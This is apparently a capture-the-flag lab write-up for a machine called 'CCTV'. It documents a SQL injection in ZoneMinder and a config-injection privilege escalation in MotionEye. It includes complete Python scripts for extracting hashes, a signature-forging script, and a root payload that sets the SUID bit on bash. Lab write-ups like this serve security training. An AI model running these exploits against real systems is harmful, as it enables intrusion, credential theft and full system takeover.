Machine Overview

CCTV is a Medium-rated Linux machine running two surveillance platforms. ZoneMinder 1.37.63 is public-facing and vulnerable to a boolean-based SQL injection (CVE-2024-51482) that leaks bcrypt password hashes. After cracking the hash and SSHing in, an internal MotionEye 0.43.1b4 instance running as root is exploited via a configuration injection vulnerability (CVE-2025-60787) — where shell metacharacters in a config field trigger command execution when the motion daemon processes filenames.

// Section 03

Initial Access — CVE-2024-51482 SQLi

03
SQL Injection — event.php removetag
Phase 2.1 — Boolean UNION Extraction via tid Parameter

ZoneMinder 1.37.63 passes the tid parameter in the event tag removal endpoint directly into a SQL query without sanitisation. The injection is boolean-based UNION with 4 columns. The oracle: a response without "response" in the JSON body means the condition was true (row matched).

✕
CVE-2024-51482: The tid parameter in web/ajax/event.php is unsanitised. A valid ZMSESSID cookie is required but any authenticated user (including the default admin account) can exploit it.
http — vulnerable endpoint
GET /zm/index.php?view=request&request=event&action=removetag&tid=<PAYLOAD>
Cookie: ZMSESSID=<your_session_cookie>
sql — example payload
-- Test if char at position 1 of mark's password hash is '$' (ASCII 36)
0 UNION SELECT 1,2,3,4 FROM Users WHERE Id=2 AND ASCII(SUBSTRING(Password,1,1))=36
04
Automated Hash Extraction Script
Phase 2.2 — Character-by-Character Boolean Oracle

A Python script extracts the full 60-character bcrypt hash for each user character-by-character. The charset is optimised for bcrypt format ($2y$10$...) to minimise requests. A fallback to full printable ASCII handles any unexpected characters.

python — extract_hashes.py
import requests, sys

URL    = 'http://cctv.htb/zm/index.php'
COOKIE = {'ZMSESSID': sys.argv[1]}

# Charset optimised for bcrypt ($2y$10$...)
CHARSET = [ord(c) for c in '$2abcdefghijklmnopqrstuvwxyz0123456789./ABCDEFGHIJKLMNOPQRSTUVWXYZ']

def check(user_id, pos, asc_val):
    payload = (
        f'0 UNION SELECT 1,2,3,4 FROM Users '
        f'WHERE Id={user_id} AND ASCII(SUBSTRING(Password,{pos},1))={asc_val}'
    )
    params = {'view':'request','request':'event','action':'removetag','tid':payload}
    r = requests.get(URL, params=params, cookies=COOKIE, timeout=5)
    return '"response"' not in r.text and r.status_code == 200

for uid, uname in [(1,'superadmin'),(2,'mark')]:
    password = ''
    for pos in range(1, 61):
        found = False
        for asc in CHARSET:
            if check(uid, pos, asc):
                password += chr(asc); found = True; break
        if not found:
            for asc in range(32,127):
                if check(uid, pos, asc):
                    password += chr(asc); found = True; break
        if not found: password += '?'
    print(f'{uname} hash: {password}')

✕

07
CVE-2025-60787 — Config Injection in image_file_name
Phase 3.2 — Shell Metacharacters in Motion Config

MotionEye ≤ 0.43.1b4 writes user-supplied config values directly into motion .conf files without sanitising shell metacharacters. The web UI has client-side JavaScript validation (configUiValid()) that rejects special characters — but this is trivially bypassed by calling the REST API directly.

✕
CVE-2025-60787: The image_file_name (picture_filename) field is written verbatim into motion's config. When motion processes the filename using shell expansion, $(command) substitution is executed — giving arbitrary command execution as the motion process owner (root).
08
API Authentication — HMAC Signature Forging
Phase 3.3 — Admin Hash from motion.conf + compute_signature()

The MotionEye REST API authenticates via HMAC-style signatures. Every request needs _username and _signature query parameters. The key is the admin password SHA1 hash, stored in plaintext in motion.conf. The signature algorithm applies a character-replacement regex before SHA1 hashing.

bash
grep admin_password /etc/motioneye/motion.conf
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
◈
Signature formula: SHA1("METHOD:path_with_sorted_query:body:key") — all non-safe characters replaced with - via [^a-zA-Z0-9/?_.=&{}\[\]":, -] before hashing. The key is the admin password SHA1 hash from motion.conf.
09
Exploitation — Inject Payload + Trigger via all-frames
Phase 3.4 — Full Config Round-Trip + emulate_motion Override

The exploit must GET the full camera config first (partial updates cause HTTP 500), inject the payload, then POST the entire config back. Setting capture_mode: "all-frames" enables emulate_motion on and picture_output on — forcing motion to attempt picture saves (and thus filename processing) even without a live camera source.

python — motioneye_rce.py
import hashlib, re, urllib.parse, requests, json

_SIGNATURE_REGEX = re.compile(r"[^a-zA-Z0-9/?_.=&{}\[\]\":, -]")
KEY  = "989c5a8ee87a0e9521ec81a79187d162109282f0"
BASE = "http://127.0.0.1:8765"

def compute_sig(method, path_with_query, body=""):
    parts = list(urllib.parse.urlsplit(path_with_query))
    query = [q for q in urllib.parse.parse_qsl(parts[3], keep_blank_values=True)
             if q[0] != "_signature"]
    query.sort(key=lambda q: q[0])
    query = [(n, urllib.parse.quote(v, safe="!'()*~")) for (n,v) in query]
    parts[0] = parts[1] = ""
    parts[3] = "&".join([q[0]+"="+q[1] for q in query])
    path = _SIGNATURE_REGEX.sub("-", urllib.parse.urlunsplit(parts))
    k    = _SIGNATURE_REGEX.sub("-", KEY)
    body_str = _SIGNATURE_REGEX.sub("-", body) if body else ""
    return hashlib.sha1(f"{method}:{path}:{body_str}:{k}".encode()).hexdigest().lower()

# Step 1 — Fetch full camera config (required — partial update → 500)
qget = "/config/1/get?_username=admin"
r    = requests.get(f"{BASE}{qget}&_signature={compute_sig('GET', qget)}")
ui   = r.json()

# Step 2 — Inject payload into image_file_name
ui["image_file_name"] = "$(chmod u+s /bin/bash).%Y-%m-%d"
ui["capture_mode"]    = "all-frames"   # emulate_motion on + picture_output on
ui["still_images"]    = True

# Step 3 — POST poisoned config back
body = json.dumps(ui)
qset = "/config/1/set?_username=admin"
r    = requests.post(f"{BASE}{qset}&_signature={compute_sig('POST', qset, body)}",
                     data=body, headers={"Content-Type": "application/json"})
print(f"[*] Config update: {r.status_code} — {r.text}")
print("[*] Wait ~60s for motion restart, then: /bin/bash -p")

Key Takeaways
01 //
Boolean SQLi Beats Time-Based for Hashes
Boolean/UNION-based SQL injection is deterministic and significantly faster than time-based for extracting long strings like bcrypt hashes. An optimised charset (bcrypt alphabet first) further reduces request count per character.
02 //
Client-Side Validation Is Not Security
MotionEye's configUiValid() JavaScript function was the only barrier preventing shell metacharacters in config fields. Direct REST API calls bypass it entirely. Security controls must be enforced server-side.
03 //
Running Services as root is Dangerous
MotionEye's systemd unit ran as User=root, turning a config injection vulnerability into full system compromise. Services should run under dedicated low-privilege accounts with minimal filesystem permissions.
04 //
Full Config Round-Trip Required
The MotionEye API returns HTTP 500 on partial config updates. The exploit must GET the complete config, modify only the target fields, and POST the entire object back. Skipping the GET step causes the update to fail silently.
05 //
emulate_motion Triggers Without a Camera
Without a valid RTSP source, motion cannot capture frames and won't process picture_filename. Setting capture_mode: all-frames enables emulate_motion — forcing picture saves and triggering the filename injection even with no live video feed.
06 //
Default Credentials Open the Door
The entire attack chain begins with admin:admin — ZoneMinder's default credentials — which provided the session cookie required to exploit CVE-2024-51482. Default credentials must be changed on every deployment before exposure to any network.
